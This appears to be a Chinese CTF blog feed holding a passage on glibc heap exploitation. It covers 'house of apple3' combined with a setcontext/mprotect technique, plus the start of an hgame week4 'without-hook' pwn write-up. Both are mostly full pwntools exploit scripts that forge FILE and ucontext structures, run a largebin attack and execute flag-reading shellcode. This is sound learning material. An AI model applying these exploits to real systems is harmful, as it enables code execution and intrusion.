class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python">fake_IO_file_addr = heap + <span class="hljs-number">0xcf0</span><br>fake_ucontext_addr = fake_IO_file_addr + <span class="hljs-number">0x100</span> <br><br><span class="hljs-comment"># house of apple3</span><br>fake_IO_file = p64(<span class="hljs-number">0xffffffffffffffff</span>)<span class="hljs-comment">#_IO_read_endtable</span><br>fake_IO_file += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">1</span>) <br>fake_IO_file = fake_IO_file.ljust(<span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_file += p64(fake_IO_file_addr + <span class="hljs-number">0x100</span>)<span class="hljs-comment"># _IO_buf_end = fake_addr</span><br>fake_IO_file = fake_IO_file.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_file += p64(fake_IO_file_addr + <span class="hljs-number">0x40</span>)<span class="hljs-comment">#  _codecvt</span><br>fake_IO_file += p64(_IO_wide_data_1)<span class="hljs-comment"># 尽量保持不变</span><br>fake_IO_file = fake_IO_file.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_file += p64(_IO_wfile_jumps + <span class="hljs-number">0x8</span>)<span class="hljs-comment"># vtable</span><br>fake_IO_file = fake_IO_file.ljust(<span class="hljs-number">0xf0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># fake_ucontext_addr</span><br>fake_IO_file += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span><br>fake_IO_file += p64(setcontext)<br><br><span class="hljs-comment"># house of 一骑当千</span><br>rdi  = fake_ucontext_addr &amp; ~<span class="hljs-number">0xfff</span>  <span class="hljs-comment"># heap_addr binsh_addr</span><br>rsi  = <span class="hljs-number">0x1000</span>      <br>rbp  = fake_ucontext_addr  + <span class="hljs-number">0x100</span><br>rbx  = <span class="hljs-number">0</span><br>rdx  = <span class="hljs-number">7</span><br>rcx  = <span class="hljs-number">0</span><br>rax  = <span class="hljs-number">0</span><br>rsp  = fake_ucontext_addr + <span class="hljs-number">0x100</span><br>rip  = mprotect<br><br>ucontext = <span class="hljs-string">b&#x27;&#x27;</span><br>ucontext += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span><br>ucontext += p64(rdi) + p64(rsi)<br>ucontext += p64(rbp) + p64(rbx)<br>ucontext += p64(rdx) + p64(rcx)<br>ucontext += p64(rax)<br>ucontext += p64(rsp) + p64(rip)<br>ucontext = ucontext.ljust((<span class="hljs-number">0xe0</span> - <span class="hljs-number">0x30</span>), <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>ucontext += p64(heap + <span class="hljs-number">0x1000</span>)<br>ucontext = ucontext.ljust((<span class="hljs-number">0x100</span> - <span class="hljs-number">0x30</span>), <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>shellcode = p64(fake_ucontext_addr + <span class="hljs-number">0x110</span>) + p64(<span class="hljs-number">0</span>) + asm(shellcraft.cat(<span class="hljs-string">&#x27;flag&#x27;</span>))<br><br>payload = fake_IO_file + ucontext + <span class="hljs-built_in">bytes</span>(shellcode)<br></code></pre></td></tr></table></figure><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>这里以2023 hgame week4 pwn without-hook为例，具体分析可以看<a href="https://lst-oss.github.io/2023/02/06/2022-hgame-week4/">2022-hgame-week4</a>，那一篇是使用house of cat打的。这里我们使用新方法。</p><p>详细wp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./vuln&#x27;</span><br>elf = ELF(fn)<br><span class="hljs-comment"># libc = ELF(&#x27;/home/haha2022/tools/glibc-all-in-one/libs/2.36-0ubuntu4_amd64/libc.so.6&#x27;)</span><br>libc = elf.libc<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>    p = remote(<span class="hljs-string">&#x27;week-4.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">30776</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(fn)<br><br><br>malloc_hook, free_hook = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>system, execve, binsh = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>setcontext, mprotect = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_<span class="hljs-built_in">open</span>, read, write = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_list_all,  _IO_stdfile_2_lock, _IO_wide_data_1 = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_file_jumps, _IO_wfile_jumps, _IO_cookie_jumps, _IO_obstack_jumps = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_wfile_jumps_mmap = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_gadgets</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">global</span> malloc_hook, free_hook, binsh, system, execve, setcontext, _<span class="hljs-built_in">open</span>, read, write, mprotect<br>    <span class="hljs-keyword">global</span>  _IO_list_all, _IO_stdfile_2_lock, _IO_wide_data_1<br>    <span class="hljs-keyword">global</span> _IO_file_jumps, _IO_wfile_jumps, _IO_cookie_jumps, _IO_obstack_jumps, _IO_wfile_jumps_mmap<br><br>    free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    malloc_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    <br>    binsh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br>    system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    execve = libc_base + libc.sym[<span class="hljs-string">&#x27;execve&#x27;</span>]<br>    <br>    setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>    mprotect = libc_base + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>    <br>    _<span class="hljs-built_in">open</span> = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>    read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>    write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>    _IO_list_all = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>    <br>    _IO_stdfile_2_lock = libc_base + <span class="hljs-number">0x1f8a20</span><br>    _IO_wide_data_1 = libc_base + <span class="hljs-number">0x1f69a0</span><br>    _IO_file_jumps = libc_base<br>    _IO_wfile_jumps = libc_base + <span class="hljs-number">0x1f3240</span><br>    _IO_wfile_jumps_mmap = libc_base<br>    _IO_obstack_jumps = libc_base<br>    _IO_cookie_jumps = libc_base<br><br>    <br>    log.success(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>    log.success(<span class="hljs-string">&#x27;malloc_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br>    log.success(<span class="hljs-string">&#x27;free_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(free_hook))<br>    log.success(<span class="hljs-string">&#x27;system: &#x27;</span> + <span class="hljs-built_in">hex</span>(system))<br>    log.success(<span class="hljs-string">&#x27;execve: &#x27;</span> + <span class="hljs-built_in">hex</span>(execve))<br>    log.success(<span class="hljs-string">&#x27;setcontext: &#x27;</span> + <span class="hljs-built_in">hex</span>(setcontext))<br>    log.success(<span class="hljs-string">&#x27;mprotect: &#x27;</span> + <span class="hljs-built_in">hex</span>(mprotect))<br>    log.success(<span class="hljs-string">&#x27;IO_llist_all: &#x27;</span> + <span class="hljs-built_in">hex</span>(_IO_list_all))<br><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br><br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(x)<br>rt = <span class="hljs-keyword">lambda</span> x: p.can_recv_raw(timeout=x)<br><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">4</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    menu(<span class="hljs-number">3</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Content: &#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">2</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_exit</span>():<br>    menu(<span class="hljs-number">5</span>)<br><br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x520</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x520</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x500</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">2</span>)<br><br>show(<span class="hljs-number">2</span>)<br>heap = u64(rv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x290</span><br>lg(<span class="hljs-string">&#x27;heap&#x27;</span>, heap)<br><br>show(<span class="hljs-number">0</span>)<br>leak = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;leak&#x27;</span>, leak)<br>libc_base = leak - <span class="hljs-number">0x1f6cc0</span> - <span class="hljs-number">0x20</span><br><br>get_gadgets(libc_base)<br><br><span class="hljs-comment"># libc-2.37-1</span><br>pop_rdi_ret = libc_base + <span class="hljs-number">0x00000000000240e5</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x000000000002573e</span><br>pop_rdx_ret = libc_base + <span class="hljs-number">0x0000000000026302</span><br>pop_rax_ret = libc_base + <span class="hljs-number">0x0000000000040123</span><br>syscall_ret = libc_base + <span class="hljs-number">0x000000000008b966</span><br>ret = pop_rdi_ret + <span class="hljs-number">1</span><br><br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x510</span>)<br><br>payload = p64(libc_base + <span class="hljs-number">0x1f7100</span>) * <span class="hljs-number">2</span> + p64(heap + <span class="hljs-number">0x290</span>) + p64(_IO_list_all - <span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-number">0</span>, payload)<br><br>delete(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x540</span>)<br><br>edit(<span class="hljs-number">1</span>, payload)<br><br>fake_IO_file_addr = heap + <span class="hljs-number">0xcf0</span><br>fake_ucontext_addr = fake_IO_file_addr + <span class="hljs-number">0x100</span> <br><br><span class="hljs-comment"># house of apple3</span><br>fake_IO_file = p64(<span class="hljs-number">0xffffffffffffffff</span>)<span class="hljs-comment">#_IO_read_endtable</span><br>fake_IO_file += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">1</span>) <br>fake_IO_file = fake_IO_file.ljust(<span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_file += p64(fake_IO_file_addr + <span class="hljs-number">0x100</span>)<span class="hljs-comment"># _IO_buf_end = fake_addr</span><br>fake_IO_file = fake_IO_file.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_file += p64(fake_IO_file_addr + <span class="hljs-number">0x40</span>)<span class="hljs-comment">#  _codecvt</span><br>fake_IO_file += p64(_IO_wide_data_1)<span class="hljs-comment"># 尽量保持不变</span><br>fake_IO_file = fake_IO_file.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_file += p64(_IO_wfile_jumps + <span class="hljs-number">0x8</span>)<span class="hljs-comment"># vtable</span><br>fake_IO_file = fake_IO_file.ljust(<span class="hljs-number">0xf0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># fake_ucontext_addr</span><br>fake_IO_file += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span><br>fake_IO_file += p64(setcontext)<br><br>rdi  = fake_ucontext_addr &amp; ~<span class="hljs-number">0xfff</span>  <span class="hljs-comment"># heap_addr binsh_addr</span><br>rsi  = <span class="hljs-number">0x1000</span>      <br>rbp  = fake_ucontext_addr  + <span class="hljs-number">0x100</span><br>rbx  = <span class="hljs-number">0</span><br>rdx  = <span class="hljs-number">7</span><br>rcx  = <span class="hljs-number">0</span><br>rax  = <span class="hljs-number">0</span><br>rsp  = fake_ucontext_addr + <span class="hljs-number">0x100</span><br>rip  = mprotect<br><br>ucontext = <span class="hljs-string">b&#x27;&#x27;</span><br>ucontext += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span><br>ucontext += p64(rdi) + p64(rsi)<br>ucontext += p64(rbp) + p64(rbx)<br>ucontext += p64(rdx) + p64(rcx)<br>ucontext += p64(rax)<br>ucontext += p64(rsp) + p64(rip)<br>ucontext = ucontext.ljust((<span class="hljs-number">0xe0</span> - <span class="hljs-number">0x30</span>), <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>ucontext += p64(heap + <span class="hljs-number">0x1000</span>)<br>ucontext = ucontext.ljust((<span class="hljs-number">0x100</span> - <span class="hljs-number">0x30</span>), <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>shellcode = p64(fake_ucontext_addr + <span class="hljs-number">0x110</span>) + p64(<span class="hljs-number">0</span>) + asm(shellcraft.cat(<span class="hljs-string">&#x27;flag&#x27;</span>))<br><br>payload = fake_IO_file + ucontext + <span class="hljs-built_in">bytes</span>(shellcode)<br><br>edit(<span class="hljs-number">2</span>, payload)<br><br>gdb.attach(p, <span class="hljs-string">&#x27;b setcontext&#x27;</span>)<br>pause()<br><br>_exit()<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p><strong>house of apple3的调用链，最终执行到setcontext</strong></p><p><img src="/img/house-of-%E4%B8%80%E9%AA%91%E7%BB%9D%E5%B0%98/image-20230216140325429.png" alt="image-20230216140325429"></p><p><img src="/img/house-of-%E4%B8%80%E9%AA%91%E7%BB%9D%E5%B0%98/image-20230216140540993.png" alt="image-20230216140540993"></p><p><strong>调用mpotect，执行我们的orw</strong></p><p><img src="/img/house-of-%E4%B8%80%E9%AA%91%E7%BB%9D%E5%B0%98/image-20230216140705434.png" alt="image-20230216140705434"></p><p><img src="/img/house-of-%E4%B8%80%E9%AA%91%E7%BB%9D%E5%B0%98/image-20230216140644206.png" alt="image-20230216140644206"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这篇文章结合了<strong>house of apple3</strong>与<strong>house of 一骑绝尘</strong>。容易想到的是，<strong>house of 一骑绝尘</strong>还可以与<strong>house of apple2</strong>，甚至其他的house of 系列结合，比如<a href="https://bbs.kanxue.com/user-home-894406.htm">我超啊师傅</a>同时提出的house of 魑魅魍魉。不得不说，师傅们真的太强了，向师傅们学习。</p><p><strong>参考文章：</strong></p><p><a href="https://bbs.kanxue.com/thread-276056.htm">https://bbs.kanxue.com/thread-276056.htm</a></p><p><a href="https://bbs.kanxue.com/thread-273863.htm">https://bbs.kanxue.com/thread-273863.htm</a></p>]]></content>
    
    
    <categories>
      
      <category>house系列</category>
      
    </categories>
    
    
    <tags>
      
      <tag>house系列</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022-hgame-week4</title>
    <link href="/2023/02/06/2022-hgame-week4/"/>
    <url>/2023/02/06/2022-hgame-week4/</url>
    
    <content type="html"><![CDATA[<h1 id="hgame-week4-PWN"><a href="#hgame-week4-PWN" class="headerlink" title="hgame week4 PWN"></a>hgame week4 PWN</h1><h2 id="without-hook"><a href="#without-hook" class="headerlink" title="without-hook"></a>without-hook</h2><p>本题是标准的菜单堆题，白给的uaf漏洞，唯一的难点就是使用了libc-2.36-2。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./vuln&#x27;</span><br>elf = ELF(fn)<br><span class="hljs-comment"># libc = ELF(&#x27;/home/haha2022/tools/glibc-all-in-one/libs/2.36-0ubuntu4_amd64/libc.so.6&#x27;)</span><br>libc = elf.libc<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>    p = remote(<span class="hljs-string">&#x27;week-4.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">30776</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(fn)<br><br><br>malloc_hook, free_hook = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>system, execve, binsh = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>setcontext, mprotect = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_<span class="hljs-built_in">open</span>, read, write = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_list_all,  _IO_stdfile_2_lock = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_file_jumps, _IO_wfile_jumps, _IO_cookie_jumps, _IO_obstack_jumps = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_wfile_jumps_mmap = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_gadgets</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">global</span> malloc_hook, free_hook, binsh, system, execve, 